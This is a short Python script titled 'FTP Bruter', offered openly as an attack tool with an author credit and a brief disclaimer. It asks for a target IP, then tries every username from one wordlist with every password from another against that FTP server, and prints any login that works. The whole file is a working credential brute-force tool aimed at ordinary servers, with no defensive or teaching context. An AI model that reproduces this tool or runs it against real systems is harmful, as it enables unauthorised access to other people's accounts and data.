from __future__ import print_function
import ftplib
import termcolor;from termcolor import colored
from ftplib import FTP
import os
print("""FTP Bruter
1.Exploit-Author:Tekchand
2.Should not use in like agency
3.I am not responsible for any conflict""")
print ("\n")
handler=raw_input("Enter the ip of the ftp connection: ")
print(os.popen('clear','rb').read())
print(colored('[*] Attempting to Brute force...','yellow',attrs=['bold']))
print("HOST\t\t\t\tSTATUS")
with open("ftpusernames.txt",'rb') as fp:
    for i in fp.readlines():
        with open("ftppasswords.txt",'rb') as tp:
            for j in tp.readlines():
                try:
                    remote=FTP(handler,user=i.strip(),passwd=j.strip())
                    if remote.connect():
                        print(handler,colored("\t\t\tConnected",'green',attrs=['bold']))
                        print("username: ",end=i)
                        print("password: ",end=j)
                        break
                except:
                    print(handler,colored("\t\t\tFailed to connect",'red',attrs=['bold']))
